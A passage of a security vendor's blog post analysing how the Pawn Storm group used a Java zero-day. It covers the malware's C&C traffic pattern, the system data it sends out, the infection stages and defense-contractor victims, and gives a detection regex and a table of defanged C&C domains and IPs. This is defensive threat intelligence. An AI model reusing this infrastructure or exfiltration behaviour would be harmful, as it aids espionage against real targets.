<p>It bears stressing that we do not encourage using the data presented above as IOCs for your own analysis. The network traffic generated by this stage was a challenge to assess as it appears to have polymorphic capabilities in the¬†creation of URI paths utilized to pull down files. After assessing the samples multiple times, each network traffic infection sequence appeared to be different, no matter what sequence of testing was performed (e.g., same machine, different machines, different geographic IP space globally, etc.).</p>
<p>After detailed network forensics of the traffic, it was determined that no single stable URL path or URI query component (URI path component, file name, or URI query parameter) showed a consistent pattern (either same entry nor regex definable pattern), and further reverse engineering was required to determine the methods used to achieve this.</p>
<p>As a result of this additional analysis, it was determined that the URI path is a random generated string with the following pattern:</p>
<ul>
<li>^/([a-zA-Z0-9]{1,6}/){1,5}[a-zA-Z0-9]{1,7}\.(xml|pdf|htm|zip)/\?[a-zA-Z0-9]{1,3}=&lt;Encoded ID&gt;</li>
</ul>
<p align="center"><img src="http://blog.trendmicro.com/trendlabs-security-intelligence/files/2015/07/regex.png" alt="" /></p>
<p align="center"><i>Figure 4. Regex expression</i></p>
<p>Included in the POST request is a data encoded with Base64 and XOR encryption. The encoded data contains the following system information of the infected machine:</p>
<ul>
<li>OS Version</li>
<li>List of running processes</li>
<li>Hard Disk Drive Information</li>
<li>Volume Serial Number</li>
</ul>
<p>TSPY_SEDNIT.C connects to three C&amp;C servers:</p>
<ul>
<li>192[.]111[.]146[.]185 (direct to IP call)</li>
<li>www[.]acledit[.]com</li>
<li>www[.]biocpl[.]org</li>
</ul>
<p>After sending the encrypted data it will wait for a reply which is encrypted by the same algorithm above.</p>
<p><b><i>Phase 2 of the attack: the keystroke logger</i></b></p>
<p>Based on our investigation of Operation Pawn Storm, we know that the infection happens in two stages:</p>
<ul>
<li>In phase 1, opening the email attachment or clicking on the malicious URI initiates the download of the first level dropper, which installs the downloader component (.DLL file).</li>
<li>In phase 2, the downloader component communicates with a C&amp;C server and downloads other components, and at the end of the chain a keylogger is installer. The keylogger sends data back to the C&amp;C server.</li>
</ul>
<p>As of writing, we have not succeeded in triggering Phase 2, which will download a fourth stage malware from the C&amp;C servers. This fourth stage malware is expected to be an encrypted executable file.</p>
<p><strong><em>Victims of the Attack</em></strong></p>
<p>A number of victims were identified during the course of our investigation. The targets are in the United States or Canada, and those we were able to identify via IP are big defense contractors, as typical for Operation PawnStorm.</p>
<p><strong><em>Countermeasures</em></strong></p>
<p>Trend Micro is already able to protect users against this threat without any necessary updates. The existing Sandbox with Script Analyzer engine, which is part of <a onclick="javascript:pageTracker._trackPageview('/outgoing/www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/http:/www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/');"  href="http://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/http:/www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/">Trend Micro‚Ñ¢ Deep Discovery</a>, can be used to detect this threat by its behavior. The Browser Exploit Prevention feature in the Endpoint Security in <a onclick="javascript:pageTracker._trackPageview('/outgoing/www.trendmicro.com/us/business/complete-user-protection/');"  href="http://www.trendmicro.com/us/business/complete-user-protection/">Trend Micro‚Ñ¢ Smart Protection Suite</a> detects the exploit once the user accesses the URL that hosted it. Our Browser Exploit Prevention detects user systems against exploits targeting browsers or related plugins.</p>
<p>Vulnerability protection in <a onclick="javascript:pageTracker._trackPageview('/outgoing/www.trendmicro.com/us/business/cloud-data/index.html');"  href="http://www.trendmicro.com/us/business/cloud-data/index.html">Trend Micro Deep Security</a> protects user systems from threats that may leverage this vulnerability with the following DPI rule:</p>
<ul>
<li>1006857 ‚Äì Oracle Java SE Remote Code Execution Vulnerability</li>
</ul>
<p>Oracle has also provided <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/oracle-patches-java-zero-day-used-in-operation-pawn-storm/">a security patch</a> for the related vulnerability.</p>
<p><strong><em>Indicators of Compromise</em></strong></p>
<p>The following table summarizes the identified stable IOCs that can be used to search for this attack. The ‚ÄúPrecision‚Äù column indicates how close to the direct parameter the indicator is, inversely indicating likelihood of collateral false positives.</p>
<table border="1">
<tbody>
<tr>
<td><strong>Stage </strong></td>
<td><strong>Type</strong></td>
<td><strong>Indicator</strong></td>
<td><strong>Precision</strong></td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 1</td>
<td>Domain</td>
<td>ausameetings[.]com</td>
<td>High</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 1</td>
<td>Domain_IP</td>
<td>95[.]215[.]45[.]189</td>
<td>Low</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 1</td>
<td>IP</td>
<td>87[.]236[.]215[.]132</td>
<td>High</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 1</td>
<td>URIPath_FileName</td>
<td>ArrayReplace.class</td>
<td>Medium</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 1</td>
<td>URIPath_FileName</td>
<td>App$PassHandleController.class</td>
<td>Medium</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 1</td>
<td>URIPath_FileName</td>
<td>Converter.class</td>
<td>Medium</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 1</td>
<td>URIPath_FileName</td>
<td>MyByteArrayInputStream.class</td>
<td>Medium</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 1</td>
<td>URIPath_FileName</td>
<td>None2.class</td>
<td>Medium</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 1</td>
<td>URIPath_FileName</td>
<td>None.class</td>
<td>Medium</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 1-&gt;2</td>
<td>URIPath_FileName</td>
<td>cormac.mcr</td>
<td>High</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 3</td>
<td></td>
<td>192[.]111[.]146[.]185</td>
<td>High</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 3</td>
<td>IP_DirectCall</td>
<td>37[.]187[.]116[.]240</td>
<td>High</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 3</td>
<td>Domain</td>
<td>www[.]acledit[.]com</td>
<td>High</td>
</tr>
<tr>
<td>Infection Sequence ‚Äì Stage 3</td>
<td>Domain</td>
<td>www[.]biocpl[.]org</td>
<td>High</td>
</tr>
</tbody>
</table>
<p>Other posts related to Operation Pawn Storm can be found here:</p>
<ul>
<li><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-update-trend-micro-discovers-new-java-zero-day-exploit/">Pawn Storm Update: Trend Micro Discovers New Java Zero-Day Exploit</a></li>
<li><a onclick="javascript:pageTracker._trackPageview('/outgoing/www.trendmicro.com/vinfo/us/security/news/cyber-attacks/pawn-storm-espionage-attacks-use-decoys-deliver-sednit');"  href="http://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/pawn-storm-espionage-attacks-use-decoys-deliver-sednit">Pawn Storm Espionage Attacks Use Decoys, Deliver SEDNIT</a></li>
<li><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/operation-pawn-storm-putting-outlook-web-access-users-at-risk/">Operation Pawn Storm: Putting Outlook Web Access Users at Risk</a></li>
<li><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-update-ios-espionage-app-found/">Pawn Storm Update: iOS Espionage App Found</a></li>
<li><a href="http://blog.trendmicro.com/trendlabs-security-intelligence/operation-pawn-storm-ramps-up-its-activities-targets-nato-white-house/">Operation Pawn Storm Ramps Up its Activities; Targets NATO, White House</a></li>
<li><a href="http://blog.trendmicro.com/pawn-storm-first-java-zero-day-attack-in-two-years-targets-nato-us-defense-organizations/" target="_blank">Pawn Storm: First Java Zero-Day Attack in Two Years Targets NATO &amp; US Defense Organizations</a></li>
</ul>
<p><em><strong>Updated on July 15, 2015, 9:57AM PDT (UTC-7)</strong> to include revised detection name for DLL file and clarifications to the infection flow.</em></p>
<p><em><strong>Updated on July 15, 2015, 1:15PM PDT (UTC-7)</strong> to¬†include more details about the infection flow.</em></p>
<p><em><strong>Updated on July 16, 2015 1:36PM PDT (UTC-7)</strong> to include screenshots of running processes.</em></p>
<div style='display:none;' class='shareaholic-canvas' data-app='share_buttons' data-title='An In-Depth Look at How Pawn Storm‚Äôs Java Zero-Day Was Used' data-link='https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/' data-app-id-name='post_below_content'></div>
<div class='yarpp-related yarpp-related-none'>
</div>
     <div class="banner-widget-area">
        <div id="text-7" class="widget-container widget_text">			<div class="textwidget"><!-- ransomware banner --><div style="text-align: center; background-color: #cc0001; border-radius:5px; overflow: hidden;"><div style="margin-top: 7px;"><img src="https://documents.trendmicro.com/images/TEx/articles/say-no-to-ransomware.jpg" style="width: 100% !important; max-width: 100% !important; float: none !important; border: 0px !important; box-shadow: none !important;"/></div><div class="ctaRansomware" style="color: #fff; padding-top: 5px; padding-bottom: 5px;">Learn how to protect Enterprises, Small Businesses, and Home Users from ransomware:</div><div style="/* display: table; */width: 90%;margin: 0 auto;margin-top: 5px;margin-bottom: 10px;text-align: center;"><div style="margin: 0 auto;display: inline-block;padding-right: 3px;background-color: #c70100;width: auto;line-height: 1em !important;min-width: 150px;font-size: 11px !important;vertical-align: middle;text-align: center;margin-bottom: 5px; margin-right: 10px;"><div style="width: 100%;"><div style="padding: 10px; background: #F9F8F8;"><a href="http://www.trendmicro.com/us/security-intelligence/enterprise-ransomware/index.html" target="_blank" style="color: #cc0001;margin-left: -5px;" rel="noopener">ENTERPRISE <span style="margin-top: -1px; position: absolute; margin-left: 5px; font-size: 17px;">¬ª</span></a></div></div></div><div style="margin: 0 auto;display: inline-block;padding-bottom: 3px;padding-top: 3px;background-color: #c70100;line-height: 1em !important;width: auto;font-size: 11px !important;vertical-align: middle;text-align: center;margin-bottom: 5px;min-width: 180px;margin-right: 10px;"><div style="width: 100%;"><div style="padding: 10px; background: #F9F8F8;"><a href="http://www.trendmicro.com/us/security-intelligence/small-business-ransomware/index.html" target="_blank" style="color: #cc0001;    margin-left: -5px;" rel="noopener">SMALL BUSINESS<span style="margin-top: -1px; position: absolute; margin-left: 5px; font-size: 17px;">¬ª</span></a></div></div></div><div style="margin: 0 auto;display: inline-block;padding: 3px;background-color: #c70100;line-height: 1em !important;width: auto;font-size: 11px !important;vertical-align: middle;text-align: center;margin-bottom: 5px;min-width: 150px;margin-right: 8px;"><div style="width: 100%;"><div style="padding: 10px; background: #F9F8F8;"><a href="http://www.trendmicro.com/us/home/consumer-ransomware/index.html" target="_blank" style="color: #cc0001;margin-left: -5px;" rel="noopener">HOME<span style="margin-top: -1px; position: absolute;  margin-left: 5px; font-size: 17px;">¬ª</span></a></div></div></div></div></div><!-- end ransomware banner --></div>
		</div>    </div>
        <div class="post-tags">
           Tags: <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/tag/apt28/" rel="tag">APT28</a><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/tag/cve-2015-2590/" rel="tag">CVE-2015-2590</a><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/tag/java-zero-day/" rel="tag">java zero-day</a><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/tag/pawn-storm/" rel="tag">Pawn Storm</a><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/tag/targeted-attack/" rel="tag">Targeted Attack</a> 		
        </div>
          </div>
    <div class="clear"></div>
  </div> <!--  CLOSE post-entry  -->
  					</div><div class="clear"></div> <!-- CLOSE PAGE CONTENT & CLEAR DIV -->
					
				</div> <!-- CLOSE CONTENT DIV -->	
				  <div id="sideBar" class= "rightSideBar">



    <div id="sideBarWidgets">
      <div id="text-6" class="widget widget_text"><h3>Security Predictions for 2020</h3>			<div class="textwidget"><ul><li>
<div style="margin-bottom:10px; margin-top:10px; background-image: url(https://documents.trendmicro.com/images/TEx/articles/TM-predictions-2020-page-cover-thumb.jpg); width:100%; height:100px; background-size: cover; background-position-y: top center;"></div>
Cybersecurity in 2020 will be viewed through many lenses ‚Äî from differing attacker motivations and cybercriminal arsenal to technological developments and global threat intelligence ‚Äî only so defenders can keep up with the broad range of threats.<br />
 <a href="https://www.trendmicro.com/vinfo/us/security/research-and-analysis/predictions/2020" target="_blank" rel="noopener"><span style="color:#c00;margin-top:5px">Read our security predictions for 2020.</span></a>
</li>
</ul></div>
		</div><div class="clear"></div><div id="text-13" class="widget widget_text"><h3>Business Process Compromise</h3>			<div class="textwidget"><ul><li>
<div style="margin-bottom:10px; margin-top:10px; background-image: url(https://documents.trendmicro.com/images/TEx/articles/sidebar-business-process-co.jpg); width:100%; height:100px; background-size: cover; background-position-y: top center;"></div>
Attackers are starting to invest in long-term operations that target specific processes enterprises rely on. They scout for vulnerable practices, susceptible systems and operational loopholes that they can leverage or abuse. To learn more,
 <a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/security-101-business-process-compromise" target="_blank" rel="noopener"><span style="color:#c00;margin-top:5px">read our Security 101: Business Process Compromise.</span></a>
</li>
</ul>
</div>
		</div><div class="clear"></div>
		<div id="recent-posts-2" class="widget widget_recent_entries">
		<h3>Recent Posts</h3>
		<ul>
											<li>
					<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/our-new-blog/">Our New Blog</a>
									</li>
											<li>
					<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/unsecure-grpc-implementations-compromise-apis-applications/">How Unsecure gRPC Implementations Can Compromise APIs, Applications</a>
									</li>
											<li>
					<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/xcsset-mac-malware-infects-xcode-projects-performs-uxss-attack-on-safari-other-browsers-leverages-zero-day-exploits/">XCSSET Mac Malware: Infects Xcode Projects, Performs UXSS Attack on Safari, Other Browsers, Leverages Zero-day Exploits</a>
									</li>
											<li>
					<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/august-patch-tuesday-fixes-critical-ie-important-windows-vulnerabilities-exploited-in-the-wild/">August Patch Tuesday Fixes Critical IE, Important Windows Vulnerabilities Exploited in the Wild</a>
									</li>
											<li>
					<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/water-nue-campaign-targets-c-suites-office-365-accounts/">Water Nue Phishing Campaign Targets C-Suite&#8217;s Office 365 Accounts</a>
									</li>
					</ul>

		</div><div class="clear"></div>
<div id="wpp-7" class="widget popular-posts">
<h3>Popular Posts</h3><!-- cached --><p class="wpp-no-data">Sorry. No data so far.</p>
</div><div class="clear"></div>
<div id="feedburner-email-subscription-3" class="widget feedburner-email-subscription"><h3>Stay Updated</h3><form class="fes fes-default" action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open( 'https://feedburner.google.com/fb/a/mailverify?uri=Anti-MalwareBlog', 'popupwindow', 'scrollbars=yes,width=550,height=520');return true" ><div class="form-group"><label class="sr-only"><span class="screen-reader-text">Email Subscription</span></label><input class="form-control search-field" type="text" value="Your email here" onfocus="if(this.value=='Your email here')this.value='';" onblur="if(this.value=='')this.value='Your email here'" name="email" /></div><button type="submit" class="btn btn-default btn-submit">Subscribe</button><input type="hidden" value="Anti-MalwareBlog" name="uri" /><input type="hidden" name="loc" value="en_US" /></form></div><div class="clear"></div>    </div><div class="clear"></div>
  </div><div class="clear"></div><!-- CLOSE SIDEBAR -->
				
			</div> <!-- CLOSE innerWrap -->
			<div class="clear"></div>
		
		</div> <!-- CLOSE contentWrapper -->
		<div class="clear"></div>
		<div id="footer">




	<div class="fullWidth">
		<ul class="site-links">
			<li><a href="http://www.trendmicro.com/us/home/index.html">Home and Home Office</a></li>
			<li>|</li>
			<li><a href="http://www.trendmicro.com/us/business/index.html">For Business</a></li>
			<li>|</li>
			<li><a href="http://www.trendmicro.com/us/security-intelligence/index.html">Security Intelligence</a></li>
			<li>|</li>
			<li><a href="http://www.trendmicro.com/us/about-us/index.html">About Trend Micro</a></li>
		</ul>

		<ul id="regions">
			<li>Asia Pacific Region (APAC):
			<a href="http://www.trendmicro.com.au/au/home/index.html">Australia</a> / 
			<a href="http://www.trendmicro.co.nz/nz/home/index.html">New Zealand</a>,
			<a href="http://cn.trendmicro.com/cn/home/index.html">‰∏≠ÂõΩ</a>,
			<a href="http://jp.trendmicro.com/jp/home/index.html">Êó•Êú¨</a>,
			<a href="http://www.trendmicro.co.kr/index.html">ÎåÄÌïúÎØºÍµ≠</a>,
			<a href="http://tw.trendmicro.com/tw/home/index.html">Âè∞ÁÅ£</a>
			</li>
			<li>Latin America Region (LAR):
			<a href="http://br.trendmicro.com/br/home/index.html">Brasil</a>,
			<a href="http://la.trendmicro.com/la/home/index.html">M√©xico</a>
			</li>
			<li class="last">North America Region (NABU):
			<a href="http://www.trendmicro.com/us/index.html">United States</a>,
			<a href="http://ca.trendmicro.com/ca/home/index.html">Canada</a>
				<br>
			</li>
			<li>Europe, Middle East, &amp; Africa Region (EMEA):
			<a href="http://www.trendmicro.fr/">France</a>,
			<a href="http://www.trendmicro.de/">Deutschland / √ñsterreich / Schweiz</a>,
			<a href="http://www.trendmicro.it/">Italia</a>,
			<a href="http://www.trendmicro.com.ru/">–†–æ—Å—Å–∏—è</a>,
			<a href="http://www.trendmicro.es/">Espa√±a</a>,
			<a href="http://www.trendmicro.co.uk/">United Kingdom / Ireland</a>
			</li>
		</ul>
	</div>
	<div class="clear"></div>											
</div>

<div class="clear"></div>

<div id="postFooter">
	<div id="postFooterContent">
		<ul id="left">
			<li><a href="http://www.trendmicro.com/us/about-us/legal-policies/privacy-statement/index.html">Privacy Statement</a></li>
			<li><a href="http://www.trendmicro.com/us/about-us/legal-policies/index.html">Legal Policies</a></li>
		</ul>

		<ul id="right">
			<li>Copyright &copy; <script>document.write(new Date().getFullYear());</script> Trend Micro Incorporated. All rights reserved.</li>
		</ul>
		<div id="post_footer_widget_area"></div>
		<div class="clear"></div>
	</div>
</div>




<!--Plugin Global Hide Admin Tool Bar Active-->

<!-- This website is patched against a big problem not solved from WordPress 3.3+ to date -->

<script async>(function(s,u,m,o,j,v){j=u.createElement(m);v=u.getElementsByTagName(m)[0];j.async=1;j.src=o;j.dataset.sumoSiteId='bcb4650331e445fc191ac9b7b41e418e46fc2a34a4d8417ac1cb72c278c31c3a';j.dataset.sumoPlatform='wordpress';v.parentNode.insertBefore(j,v)})(window,document,'script','//load.sumo.com/');</script>    <script type="application/javascript">
      var ajaxurl = "https://blog.trendmicro.com/trendlabs-security-intelligence/wp-admin/admin-ajax.php";

      function sumo_add_woocommerce_coupon(code) {
        jQuery.post(ajaxurl, {
          action: 'sumo_add_woocommerce_coupon',
          code: code,
        });
      }

      function sumo_remove_woocommerce_coupon(code) {
        jQuery.post(ajaxurl, {
          action: 'sumo_remove_woocommerce_coupon',
          code: code,
        });
      }

      function sumo_get_woocommerce_cart_subtotal(callback) {
        jQuery.ajax({
          method: 'POST',
          url: ajaxurl,
          dataType: 'html',
          data: {
            action: 'sumo_get_woocommerce_cart_subtotal',
          },
          success: function(subtotal) {
            return callback(null, subtotal);
          },
          error: function(err) {
            return callback(err, 0);
          }
        });
      }
    </script>
    <!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T8DW3SL"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->


<script type='text/javascript'>
jQuery(document).ready(function($) {
  
  if(jQuery('.Alert-widget-container').html()!=""){
     jQuery('#topBorder').append(
"<div class='AlertbarTop' style='display:none'>"+jQuery('.Alert-widget-title').text()+": "+jQuery('.Alert-widget-container.textwidget').html() +"</div>")
   }
      jQuery('#topBorder').addClass('autoHeightTopBorder');

})
</script>
<!-- tracker added by Ultimate Google Analytics plugin v1.6.0: http://www.oratransplant.nl/uga -->
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-137644-6");
pageTracker._initData();
pageTracker._trackPageview();
</script>
	<script>
		var getElementsByClassName=function(a,b,c){if(document.getElementsByClassName){getElementsByClassName=function(a,b,c){c=c||document;var d=c.getElementsByClassName(a),e=b?new RegExp("\\b"+b+"\\b","i"):null,f=[],g;for(var h=0,i=d.length;h<i;h+=1){g=d[h];if(!e||e.test(g.nodeName)){f.push(g)}}return f}}else if(document.evaluate){getElementsByClassName=function(a,b,c){b=b||"*";c=c||document;var d=a.split(" "),e="",f="http://www.w3.org/1999/xhtml",g=document.documentElement.namespaceURI===f?f:null,h=[],i,j;for(var k=0,l=d.length;k<l;k+=1){e+="[contains(concat(' ', @class, ' '), ' "+d[k]+" ')]"}try{i=document.evaluate(".//"+b+e,c,g,0,null)}catch(m){i=document.evaluate(".//"+b+e,c,null,0,null)}while(j=i.iterateNext()){h.push(j)}return h}}else{getElementsByClassName=function(a,b,c){b=b||"*";c=c||document;var d=a.split(" "),e=[],f=b==="*"&&c.all?c.all:c.getElementsByTagName(b),g,h=[],i;for(var j=0,k=d.length;j<k;j+=1){e.push(new RegExp("(^|\\s)"+d[j]+"(\\s|$)"))}for(var l=0,m=f.length;l<m;l+=1){g=f[l];i=false;for(var n=0,o=e.length;n<o;n+=1){i=e[n].test(g.className);if(!i){break}}if(i){h.push(g)}}return h}}return getElementsByClassName(a,b,c)},
			dropdowns = getElementsByClassName( 'dropdown-menu' );
		for ( i=0; i<dropdowns.length; i++ )
			dropdowns[i].onchange = function(){ 
				if(this.value != '' && this.value != '#' ){
					window.location.href = this.value; 
				}
			}
	</script>
	<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-includes/js/wp-embed.js?ver=3934800cf10e43fe39ddd35aef4d4ed8' id='wp-embed-js'></script>

</body>  
</html>